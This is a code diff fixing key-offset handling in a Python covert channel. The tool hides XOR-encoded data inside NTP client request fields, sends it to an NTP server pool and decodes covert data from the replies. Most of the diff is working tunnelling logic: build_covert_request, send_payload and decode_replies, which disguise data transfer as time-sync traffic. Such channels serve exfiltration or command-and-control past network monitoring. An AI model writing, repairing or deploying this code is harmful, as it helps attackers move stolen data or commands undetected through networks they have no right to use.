@@ -132,7 +132,9 @@ def _plausible_orig_ts() -> Tuple[int, int]:
 class NTPSession:
     session_id:   bytes = field(default_factory=lambda: secrets.token_bytes(6))
     key_stream:   bytes = field(init=False)
-    block_offset: int   = 0     # advances per burst so TX and RX keys don't overlap
+    block_offset: int   = 0     # TX block offset baseline
+    tx_label_count: int = 0     # number of TX labels in latest burst
+    reply_offset: int   = 0     # RX reply decode offset
 
     def __post_init__(self):
         self.key_stream = derive_key_stream(self.session_id, 8192)
@@ -154,6 +156,7 @@ def build_covert_request(
     seq:     int,
     total:   int,
     payload: bytes,          # exactly NTP_COVERT_BYTES raw data bytes
+    block_off: int,
 ) -> bytes:
     """
     Build a 48-byte NTP client request (Mode=3, VN=4) carrying covert data.
@@ -168,12 +171,12 @@ def build_covert_request(
       RX[0:8]     = current time             (legitimate, not overwritten)
     """
     # 32-bit encode the 20-byte chunk
-    enc = ntp_encode_chunk(payload, sess.key_stream, sess.block_offset)
+    enc = ntp_encode_chunk(payload, sess.key_stream, block_off)
 
     # Reference ID: encode seq+total using first 4 key bytes at offset -1
     # (use a dedicated slot before block_offset to avoid collision)
-    meta_key = sess.key_stream[max(0, sess.block_offset - 1) * 4 :
-                               max(0, sess.block_offset - 1) * 4 + 4]
+    meta_key = sess.key_stream[max(0, block_off - 1) * 4 :
+                               max(0, block_off - 1) * 4 + 4]
     ref_id = bytes([
         (seq   >> 8 & 0xFF) ^ meta_key[0],
         (seq        & 0xFF) ^ meta_key[1],
@@ -315,8 +318,11 @@ def send_payload(
         session = NTPSession()
 
     # 32-bit encode for TX
-    labels = encode_payload(data, session.key_stream, session.block_offset)
+    tx_start = session.block_offset
+    labels = encode_payload(data, session.key_stream, tx_start)
     n      = len(labels)
+    session.tx_label_count = n
+    session.reply_offset = tx_start + n
 
     # Pack labels into 20-byte NTP chunks (5 labels × 4 bytes = 20 bytes)
     LABELS_PER_PKT = 5
@@ -340,13 +346,14 @@ def send_payload(
 
     responses = []
     for seq, chunk_data in chunks:
-        pkt  = build_covert_request(session, seq, total_pkts, chunk_data)
+        pkt_block_off = tx_start + seq * LABELS_PER_PKT
+        pkt  = build_covert_request(session, seq, total_pkts, chunk_data, pkt_block_off)
         resp = send_ntp_packet(pkt, pool)
         if resp and len(resp) == 48:
             responses.append(resp)
 
     # advance block_offset past all TX labels
-    session.block_offset += n
+    session.block_offset = tx_start + n
     print(f"[NTP] TX done — {len(responses)}/{total_pkts} responses received")
     return session, responses
 
@@ -380,7 +387,7 @@ def decode_replies(
 
         # Server encodes seq+total in RefID using the reply key
         # (mirrored from server: same key stream, same offset logic)
-        rx_blk_off = session.block_offset    # replies start here
+        rx_blk_off = session.reply_offset
         meta_key   = session.key_stream[max(0, rx_blk_off - 1) * 4 :
                                         max(0, rx_blk_off - 1) * 4 + 4]
         seq   = ((ref_id[0] ^ meta_key[0]) << 8) | (ref_id[1] ^ meta_key[1])
@@ -422,32 +429,20 @@ def decode_replies(
     if not collected:
         return None
 
-    # Reassemble ordered raw chunks → packed labels
+    # Reassemble ordered raw chunks → labels, then use shared decode pipeline.
     ordered_chunks = [collected[k] for k in sorted(collected.keys())]
 
-    # Each 20-byte raw chunk holds 5 × 4-byte blocks = 5 Base32 labels
-    # 32-bit decode: XOR each chunk, then unpack to labels, then decode_labels
     all_labels: List[str] = []
     for pkt_idx, raw20 in enumerate(ordered_chunks):
-        block_off = session.block_offset + pkt_idx * 5
+        block_off = session.reply_offset + pkt_idx * LABELS_PER_PKT
         plain20   = ntp_decode_chunk(raw20, session.key_stream, block_off)
         for j in range(0, 20, 4):
             all_labels.append(b32enc(plain20[j : j + 4]))
 
-    # Now apply decode_labels which will Base32-dec + XOR again at the right offset
-    # Wait — the data is already XOR'd back above; we just need to deframe
-    # Actually: ntp_decode_chunk already reversed the XOR. The labels now hold
-    # plaintext 4-byte blocks. We need to reassemble them and deframe.
-    raw_plain = b""
-    for lbl in all_labels:
-        try:
-            raw_plain += b32dec(lbl)
-        except Exception:
-            raw_plain += b"\x00" * 4
-
-    result = deframe(raw_plain)
-    # advance block_offset past the RX labels
-    session.block_offset += len(all_labels)
+    # Labels reconstructed here are the original encode_payload transport labels
+    # (post-ntp layer, pre-core decode), so decode with reply_offset.
+    result = decode_labels(all_labels, session.key_stream, session.reply_offset)
+    session.block_offset = max(session.block_offset, session.reply_offset + len(all_labels))
     return result if result else None
 
 
